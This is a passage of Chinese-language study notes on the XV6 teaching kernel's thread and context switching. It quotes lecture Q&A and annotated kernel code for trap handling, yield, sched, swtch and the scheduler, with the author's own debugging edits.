class="hljs-variable constant_">CPU</span>是由用户发起的还是由内核发起的？<br>对于<span class="hljs-title class_">XV6</span>来说，并不会直接让用户线程出让<span class="hljs-variable constant_">CPU</span>或者完成线程切换，而是由内核在合适的时间点做决定。有的时候你可以猜到特定的系统调用会导致出让<span class="hljs-variable constant_">CPU</span>，例如一个用户进程读取pipe，而它知道pipe中并不能读到任何数据，这时你可以预测读取会被阻塞，而内核在等待数据的过程中会运行其他的进程。<br>内核会在两个场景下出让<span class="hljs-variable constant_">CPU</span>。当定时器中断触发了，内核总是会让当前进程出让<span class="hljs-variable constant_">CPU</span>，因为我们需要在定时器中断间隔的时间点上交织执行所有想要运行的进程。另一种场景就是任何时候一个进程调用了系统调用并等待I/O，例如等待你敲入下一个按键，在你还没有按下按键时，等待I/O的机制会触发出让<span class="hljs-variable constant_">CPU</span>。<br><br><br>用户进程调用sleep函数是不是会调用某个系统调用，然后将用户进程的信息保存在trapframe，然后触发进程切换，这时就不是定时器中断决定，而是用户进程自己决定了吧？<br>如果进程执行了read系统调用，然后进入到了内核中。而read系统调用要求进程等待磁盘，这时系统调用代码会调用sleep，而sleep最后会调用swtch函数。swtch函数会保存内核线程的寄存器到进程的context中，然后切换到对应<span class="hljs-variable constant_">CPU</span>的调度器线程，再让其他的线程运行。这样在当前线程等待磁盘读取结束时，其他线程还能运行。所以，这里的流程除了没有定时器中断，其他都一样，只是这里是因为一个系统调用需要等待I/O（注，感觉答非所问）<br><br>每一个<span class="hljs-variable constant_">CPU</span>的调度器线程有自己的栈吗？<br>是的，每一个调度器线程都有自己独立的栈。实际上调度器线程的所有内容，包括栈和context，与用户进程不一样，都是在系统启动时就设置好了。如果你查看<span class="hljs-title class_">XV6</span>的start.<span class="hljs-property">s</span>（注：是entry.<span class="hljs-property">S</span>和start.<span class="hljs-property">c</span>）文件，你就可以看到为每个<span class="hljs-variable constant_">CPU</span>核设置好调度器线程。<br><br>我们这里一直在说线程，但是从我看来<span class="hljs-title class_">XV6</span>的实现中，一个进程就只有一个线程，有没有可能一个进程有多个线程？<br>我们这里的用词的确有点让人混淆。在<span class="hljs-title class_">XV6</span>中，一个进程要么在用户空间执行指令，要么是在内核空间执行指令，要么它的状态被保存在context和trapframe中，并且没有执行任何指令。这里该怎么称呼它呢？你可以根据自己的喜好来称呼它，对于我来说，每个进程有两个线程，一个用户空间线程，一个内核空间线程，并且存在限制使得一个进程要么运行在用户空间线程，要么为了执行系统调用或者响应中断而运行在内核空间线程 ，但是永远也不会两者同时运行。<br></code></pre></td></tr></table></figure><p>这里有一个术语需要解释一下。<strong>这里说的contextswitching，指的是从一个线程切换到另一个线程，因为在切换的过程中需要先保存前一个线程的寄存器，然后再恢复之前保存的后一个线程的寄存器</strong>，这<strong>些寄存器都是保存在context对象中</strong>。<strong>在有些时候，contextswitching也指从一个用户进程切换到另一个用户进程的完整过程。偶尔你也会看到contextswitching是指从用户空间和内核空间之间的切换。对于我们这节课来说，contextswitching主要是指一个内核线程和调度器线程之间的切换。</strong></p><ol type="1"><li>一般意义：<strong>指的是从一个线程切换到另一个线程</strong></li><li>有些时候：<strong>指从一个用户进程切换到另一个用户进程的完整过程</strong></li><li>这里：指的是<strong>内核线程和调度器线程之间的切换</strong></li></ol><p>这里有一些有用的信息可以记住。<strong>每一个CPU核在一个时间只会做一件事情，每个CPU核在一个时间只会运行一个线程，它要么是运行用户进程的线程，要么是运行内核线程，要么是运行这个CPU核对应的调度器线程。</strong>所以在任何一个时间点，CPU核并没有做多件事情，而是只做一件事情。<strong>线程的切换创造了多个线程同时运行在一个CPU上的假象</strong>。类似的每一个线程<strong>要么只是运行在一个CPU核上</strong>，<strong>要么它的状态被保存在context中。</strong>线<strong>程永远不会运行在多个CPU核上，线程要么运行在一个CPU核上，要么就没有运行。</strong></p><p>在XV6的代码中，context对象总是由swtch函数产生，所以context总是保存了内核线程在执行swtch函数时的状态。当我们在恢复一个内核线程时，对于刚恢复的线程所做的第一件事情就是从之前的swtch函数中返回</p><h3 id="代码部分">代码部分</h3><p>演示：</p><p>下来会运行一个简单的演示程序，在这个程序中我们会从一个进程切换到另一个：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">#include <span class="hljs-string">&quot;kernel/types.h&quot;</span><br>#include <span class="hljs-string">&quot;user/user.h&quot;</span><br><br>int <span class="hljs-title function_">main</span>(<span class="hljs-params">int argc, char *argv[]</span>) &#123;<br>        int pid;<br>        char c;<br>        pid = <span class="hljs-title function_">fork</span>();<br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            c = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;parent pid is %d, child pid is %d\n&quot;</span>, <span class="hljs-title function_">getpid</span>(), pid);<br>            c = <span class="hljs-string">&#x27;\\&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; ; i++) &#123;<br>                <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1000000</span>) == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-title function_">write</span>(<span class="hljs-number">2</span>, &amp;c, <span class="hljs-number">1</span>); <br>                &#125;<br>        &#125;<br>        <span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序中会创建两个进程，两个进程会一直运行。代码首先通过fork创建了一个子进程，然后两个进程都会进入一个死循环，并每隔一段时间生成一个输出表明程序还在运行。但是它们都不会很频繁的打印输出（注，每隔1000000次循环才打印一个输出），并且它们也不会主动出让CPU（注，因为每个进程都执行的是没有sleep的死循环）。所以我们这里有了两个运算密集型进程，并且因为我们接下来启动的XV6只有一个CPU核，它们都运行在同一个CPU上。为了让这两个进程都能运行，有必要让两个进程之间能相互切换。</p><p>运行<code>make CPUS=1 qemu</code></p><p>你可以看到一直有字符在输出，一个进程在输出“/”，另一个进程在输出""。从输出看，虽然现在XV6只有一个CPU核，但是每隔一会，XV6就在两个进程之间切换。“/”输出了一会之后，定时器中断将CPU切换到另一个进程运行然后又输出“”一会。所以在这里我们可以看到定时器中断在起作用。</p><p>整体链路：usertrap(trap.c) =&gt; devintr(trap.c) =&gt; yield(proc.c)=&gt; swtch(proc.c) =&gt; schedule(proc.c)</p><p>xv6中通过打印可以发现，开启后默认有两个进程</p><ol type="1"><li>init进程，地址是0x9480</li><li>sh进程，地址是0x95e8</li></ol><p>进程之间差了360，进程在运行期间是会改变名称的，比如这个spin程序，其是由sh引导的，一开始叫sh，后面叫spin，其子进程也叫spin</p><p>在trap.c的devintr函数中的207行设置一个断点，这一行会识别出当前是在响应定时器中断，可以查看当前的pc，观察中断对应的汇编代码在哪一行，应该是0x62（pc）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// kernel/trap.c: 中断handle</span><br><span class="hljs-comment">// 处理中断，异常，系统调用的handle</span><br><span class="hljs-comment">// called from trampoline.S</span><br><span class="hljs-comment">//</span><br><span class="hljs-keyword">void</span><br><span class="hljs-title function_">usertrap</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  int which_dev = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span>((<span class="hljs-title function_">r_sstatus</span>() &amp; <span class="hljs-variable constant_">SSTATUS_SPP</span>) != <span class="hljs-number">0</span>)<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;usertrap: not from user mode&quot;</span>);<br><br>  <span class="hljs-comment">// send interrupts and exceptions to kerneltrap(),</span><br>  <span class="hljs-comment">// since we&#x27;re now in the kernel.</span><br>  <span class="hljs-title function_">w_stvec</span>((uint64)kernelvec);<br><br>  struct proc *p = <span class="hljs-title function_">myproc</span>();<br><br>  <span class="hljs-comment">// save user program counter.</span><br>  p-&gt;trapframe-&gt;epc = <span class="hljs-title function_">r_sepc</span>();<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_">r_scause</span>() == <span class="hljs-number">8</span>)&#123;<br>    <span class="hljs-comment">// system call</span><br><br>    <span class="hljs-keyword">if</span>(p-&gt;killed)<br>      <span class="hljs-title function_">exit</span>(-<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// sepc points to the ecall instruction,</span><br>    <span class="hljs-comment">// but we want to return to the next instruction.</span><br>    p-&gt;trapframe-&gt;epc += <span class="hljs-number">4</span>;<br><br>    <span class="hljs-comment">// an interrupt will change sstatus &amp;c registers,</span><br>    <span class="hljs-comment">// so don&#x27;t enable until done with those registers.</span><br>    <span class="hljs-title function_">intr_on</span>();<br><br>    <span class="hljs-title function_">syscall</span>();<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((which_dev = <span class="hljs-title function_">devintr</span>()) != <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-comment">// ok</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="hljs-title function_">r_scause</span>(), p-&gt;pid);<br>    <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="hljs-title function_">r_sepc</span>(), <span class="hljs-title function_">r_stval</span>());<br>    p-&gt;killed = <span class="hljs-number">1</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(p-&gt;killed)<br>    <span class="hljs-title function_">exit</span>(-<span class="hljs-number">1</span>);<br><br>  <span class="hljs-comment">// 这里是触发时钟中断，当前进程放弃cpu，进而调用yield</span><br>  <span class="hljs-keyword">if</span>(which_dev == <span class="hljs-number">2</span>)<br>    <span class="hljs-title function_">yield</span>();<br><br>  <span class="hljs-title function_">usertrapret</span>();<br>&#125;<br><span class="hljs-comment">// kernel/trap.c: 中断handle</span><br>返回值：<br><span class="hljs-number">2</span>：时钟中断<br><span class="hljs-number">1</span>：设备中断<br><span class="hljs-number">0</span>：未识别的中断<br>int<br><span class="hljs-title function_">devintr</span>(<span class="hljs-params"></span>)<br>&#123;<br>  uint64 scause = <span class="hljs-title function_">r_scause</span>();<br><br>  <span class="hljs-keyword">if</span>((scause &amp; 0x8000000000000000L) &amp;&amp;<br>     (scause &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">9</span>)&#123;<br>    <span class="hljs-comment">// this is a supervisor external interrupt, via PLIC.</span><br><br>    <span class="hljs-comment">// irq indicates which device interrupted.</span><br>    int irq = <span class="hljs-title function_">plic_claim</span>();<br><br>    <span class="hljs-keyword">if</span>(irq == <span class="hljs-title class_">UART0</span>_IRQ)&#123;<br>      <span class="hljs-title function_">uartintr</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(irq == <span class="hljs-title class_">VIRTIO0</span>_IRQ)&#123;<br>      <span class="hljs-title function_">virtio_disk_intr</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(irq)&#123;<br>      <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;unexpected interrupt irq=%d\n&quot;</span>, irq);<br>    &#125;<br><br>    <span class="hljs-comment">// the PLIC allows each device to raise at most one</span><br>    <span class="hljs-comment">// interrupt at a time; tell the PLIC the device is</span><br>    <span class="hljs-comment">// now allowed to interrupt again.</span><br>    <span class="hljs-keyword">if</span>(irq)<br>      <span class="hljs-title function_">plic_complete</span>(irq);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(scause == 0x8000000000000001L)&#123;<br>    <span class="hljs-comment">// software interrupt from a machine-mode timer interrupt,</span><br>    <span class="hljs-comment">// forwarded by timervec in kernelvec.S.</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">cpuid</span>() == <span class="hljs-number">0</span>)&#123; <br>      <span class="hljs-comment">// 没看懂，为什么cpu核心为0的时候需要特殊处理呢？？？？？？</span><br>      <span class="hljs-title function_">clockintr</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// acknowledge the software interrupt by clearing</span><br>    <span class="hljs-comment">// the SSIP bit in sip.</span><br>    <span class="hljs-title function_">w_sip</span>(<span class="hljs-title function_">r_sip</span>() &amp; ~<span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 设备中断</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">// kernel/proc.c</span><br><span class="hljs-comment">// Give up the CPU for one scheduling round.</span><br><span class="hljs-keyword">void</span><br><span class="hljs-title function_">yield</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  struct proc *p = <span class="hljs-title function_">myproc</span>(); <span class="hljs-comment">// 获取当前cpu上活跃的进程</span><br>  <span class="hljs-title function_">acquire</span>(&amp;p-&gt;lock); <span class="hljs-comment">// 加锁，</span><br> <span class="hljs-comment">// acquire(&amp;p-&gt;lock); // 这里不能重复加锁</span><br>  p-&gt;state = <span class="hljs-variable constant_">RUNNABLE</span>; <span class="hljs-comment">// 改变状态</span><br>  <span class="hljs-title function_">sched</span>();<br>  <span class="hljs-title function_">release</span>(&amp;p-&gt;lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>yield函数只做了几件事情，它首先获取了进程的锁。实际上，<strong>在锁释放之前，进程的状态会变得不一致，例如，yield将要将进程的状态改为RUNABLE，表明进程并没有在运行，但是实际上这个进程还在运行，代码正在当前进程的内核线程中运行。所以这里加锁的目的之一就是：即使我们将进程的状态改为了RUNABLE，其他的CPU核的调度器线程也不可能看到进程的状态为RUNABLE并尝试运行它。否则的话，进程就会在两个CPU核上运行了</strong>，而一个进程只有一个栈，这意味着两个CPU核在同一个栈上运行代码（注，因为XV6中一个用户进程只有一个用户线程）。</p><p>接下来yield函数中将进程的状态改为RUNABLE。这里的意思是，当前进程要出让CPU，并切换到调度器线程。当前进程的状态是RUNABLE意味着它还会再次运行，因为毕竟现在是一个定时器中断打断了当前正在运行的进程。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// kernel/proc.c</span><br><span class="hljs-comment">// Switch to scheduler.  Must hold only p-&gt;lock</span><br><span class="hljs-comment">// and have changed proc-&gt;state. Saves and restores</span><br><span class="hljs-comment">// intena because intena is a property of this</span><br><span class="hljs-comment">// kernel thread, not this CPU. It should</span><br><span class="hljs-comment">// be proc-&gt;intena and proc-&gt;noff, but that would</span><br><span class="hljs-comment">// break in the few places where a lock is held but</span><br><span class="hljs-comment">// there&#x27;s no process.</span><br><span class="hljs-keyword">void</span><br><span class="hljs-title function_">sched</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  int intena;<br>  struct proc *p = <span class="hljs-title function_">myproc</span>();<br><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_">holding</span>(&amp;p-&gt;lock))<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;sched p-&gt;lock&quot;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_">mycpu</span>()-&gt;noff != <span class="hljs-number">1</span>)<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;sched locks&quot;</span>);<br>  <span class="hljs-keyword">if</span>(p-&gt;state == <span class="hljs-variable constant_">RUNNING</span>)<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;sched running&quot;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_">intr_get</span>())<br>    <span class="hljs-title function_">panic</span>(<span class="hljs-string">&quot;sched interruptible&quot;</span>);<br><br>  intena = <span class="hljs-title function_">mycpu</span>()-&gt;intena;<br>  <span class="hljs-title function_">swtch</span>(&amp;p-&gt;context, &amp;<span class="hljs-title function_">mycpu</span>()-&gt;context);<br>  <span class="hljs-title function_">mycpu</span>()-&gt;intena = intena;<br>&#125;<br><br><span class="hljs-comment">// Must be called with interrupts disabled,</span><br><span class="hljs-comment">// to prevent race with process being moved</span><br><span class="hljs-comment">// to a different CPU.</span><br>int<br><span class="hljs-title function_">cpuid</span>(<span class="hljs-params"></span>)<br>&#123;<br>  int id = <span class="hljs-title function_">r_tp</span>();<br>  <span class="hljs-keyword">return</span> id;<br>&#125;<br><br>params.<span class="hljs-property">h</span><br>  <span class="hljs-number">1</span> #define <span class="hljs-variable constant_">NPROC</span>        <span class="hljs-number">64</span>  <span class="hljs-comment">// maximum number of processes</span><br>  <span class="hljs-number">2</span> #define <span class="hljs-variable constant_">NCPU</span>          <span class="hljs-number">8</span>  <span class="hljs-comment">// maximum number of CPUs</span><br>  <span class="hljs-number">3</span> #define <span class="hljs-variable constant_">NOFILE</span>       <span class="hljs-number">16</span>  <span class="hljs-comment">// open files per process</span><br>  <span class="hljs-number">4</span> #define <span class="hljs-variable constant_">NFILE</span>       <span class="hljs-number">100</span>  <span class="hljs-comment">// open files per system</span><br>  <span class="hljs-number">5</span> #define <span class="hljs-variable constant_">NINODE</span>       <span class="hljs-number">50</span>  <span class="hljs-comment">// maximum number of active i-nodes</span><br>  <span class="hljs-number">6</span> #define <span class="hljs-variable constant_">NDEV</span>         <span class="hljs-number">10</span>  <span class="hljs-comment">// maximum major device number</span><br>  <span class="hljs-number">7</span> #define <span class="hljs-variable constant_">ROOTDEV</span>       <span class="hljs-number">1</span>  <span class="hljs-comment">// device number of file system root disk</span><br>  <span class="hljs-number">8</span> #define <span class="hljs-variable constant_">MAXARG</span>       <span class="hljs-number">32</span>  <span class="hljs-comment">// max exec arguments</span><br>  <span class="hljs-number">9</span> #define <span class="hljs-variable constant_">MAXOPBLOCKS</span>  <span class="hljs-number">10</span>  <span class="hljs-comment">// max # of blocks any FS op writes</span><br> <span class="hljs-number">10</span> #define <span class="hljs-variable constant_">LOGSIZE</span>      (<span class="hljs-variable constant_">MAXOPBLOCKS</span>*<span class="hljs-number">3</span>)  <span class="hljs-comment">// max data blocks in on-disk log</span><br> <span class="hljs-number">11</span> #define <span class="hljs-variable constant_">NBUF</span>         (<span class="hljs-variable constant_">MAXOPBLOCKS</span>*<span class="hljs-number">3</span>)  <span class="hljs-comment">// size of disk block cache</span><br> <span class="hljs-number">12</span> #define <span class="hljs-variable constant_">FSSIZE</span>       <span class="hljs-number">1000</span>  <span class="hljs-comment">// size of file system in blocks</span><br> <span class="hljs-number">13</span> #define <span class="hljs-variable constant_">MAXPATH</span>      <span class="hljs-number">128</span>   <span class="hljs-comment">// maximum file path name</span><br><br>risc.<span class="hljs-property">h</span>：cpu相关代码<br></code></pre></td></tr></table></figure><p>可以看出，sched函数基本没有干任何事情，只是做了一些合理性检查，如果发现异常就panic。为什么会有这么多检查？因为这里的XV6代码已经有很多年的历史了，这些代码经历过各种各样的bug，相应的这里就有各种各样的合理性检查和panic来避免可能的bug。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// kernrl/swtch.S</span><br># <span class="hljs-title class_">Context</span> <span class="hljs-keyword">switch</span><br>#<br>#   <span class="hljs-keyword">void</span> <span class="hljs-title function_">swtch</span>(struct context *old, struct context *<span class="hljs-keyword">new</span>);<br># <br># <span class="hljs-title class_">Save</span> current registers <span class="hljs-keyword">in</span> old. <span class="hljs-title class_">Load</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">new</span>. <br><br><br>.<span class="hljs-property">globl</span> swtch<br><span class="hljs-attr">swtch</span>:<br>        <br>        sd ra, <span class="hljs-number">0</span>(a0)<br>        sd sp, <span class="hljs-number">8</span>(a0)<br>        sd s0, <span class="hljs-number">16</span>(a0)<br>        sd s1, <span class="hljs-number">24</span>(a0)<br>        sd s2, <span class="hljs-number">32</span>(a0)<br>        sd s3, <span class="hljs-number">40</span>(a0)<br>        sd s4, <span class="hljs-number">48</span>(a0)<br>        sd s5, <span class="hljs-number">56</span>(a0)<br>        sd s6, <span class="hljs-number">64</span>(a0)<br>        sd s7, <span class="hljs-number">72</span>(a0)<br>        sd s8, <span class="hljs-number">80</span>(a0)<br>        sd s9, <span class="hljs-number">88</span>(a0)<br>        sd s10, <span class="hljs-number">96</span>(a0)<br>        sd s11, <span class="hljs-number">104</span>(a0)<br><br>        <span class="hljs-comment">// </span><br>        ld ra, <span class="hljs-number">0</span>(a1)<br>        ld sp, <span class="hljs-number">8</span>(a1)<br>        ld s0, <span class="hljs-number">16</span>(a1)<br>        ld s1, <span class="hljs-number">24</span>(a1)<br>        ld s2, <span class="hljs-number">32</span>(a1)<br>        ld s3, <span class="hljs-number">40</span>(a1)<br>        ld s4, <span class="hljs-number">48</span>(a1)<br>        ld s5, <span class="hljs-number">56</span>(a1)<br>        ld s6, <span class="hljs-number">64</span>(a1)<br>        ld s7, <span class="hljs-number">72</span>(a1)<br>        ld s8, <span class="hljs-number">80</span>(a1)<br>        ld s9, <span class="hljs-number">88</span>(a1)<br>        ld s10, <span class="hljs-number">96</span>(a1)<br>        ld s11, <span class="hljs-number">104</span>(a1)<br>        ret<br></code></pre></td></tr></table></figure><p>swtch函数会将当前的内核线程的寄存器保存到p-&gt;context中。swtch函数的另一个参数c-&gt;context，c表示当前CPU的结构体。CPU结构体中的context保存了当前CPU核的调度器线程的寄存器。所以swtch函数在保存完当前内核线程的内核寄存器之后，就会恢复当前CPU核的调度器线程的寄存器，并继续执行当前CPU核的调度器线程。</p><p>context: 4, 0x0000000080009750</p><p>s6: old process address: 0x0000000080009750</p><p>New process：0x00000000800098b8, pid: 5</p><p>这里看到的就是之前保存的当前CPU核的调度器线程的寄存器。在这些寄存器中，最有趣的就是ra（ReturnAddress）寄存器，因为ra寄存器保存的是当前函数的返回地址，所以调度器线程中的代码会返回到ra寄存器中的地址。通过查看kernel.asm，我们可以知道这个地址的内容是什么。也可以在gdb中输入“x/i0x80001f2e”进行查看。</p><p>输出中包含了地址中的指令和指令所在的函数名。所以我们将要返回到scheduler函数中。</p><p>首先，ra寄存器被保存在了a0寄存器指向的地址。a0寄存器对应了swtch函数的第一个参数，从前面可以看出这是当前线程的context对象地址；a1寄存器对应了swtch函数的第二个参数，从前面可以看出这是即将要切换到的调度器线程的context对象地址。</p><p>所以函数中上半部分是将当前的寄存器保存在当前线程对应的context对象中，函数的下半部分是将调度器线程的寄存器，也就是我们将要切换到的线程的寄存器恢复到CPU的寄存器中。之后函数就返回了。所以调度器线程的ra寄存器的内容才显得有趣，因为它指向的是swtch函数返回的地址，也就是scheduler函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">void</span><br><span class="hljs-title function_">scheduler</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br>&#123;<br>  <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;----%d----\n&quot;</span>);<br>  struct proc *p; <br>  struct cpu *c = <span class="hljs-title function_">mycpu</span>();<br>  c-&gt;proc = <span class="hljs-number">0</span>;<br>  <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;helloe====================\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">// Avoid deadlock by ensuring that devices can interrupt.</span><br>   <span class="hljs-comment">// intr_on();</span><br><br>    <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[<span class="hljs-variable constant_">NPROC</span>]; p++) &#123;<br>             <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;======name: %s, addr: 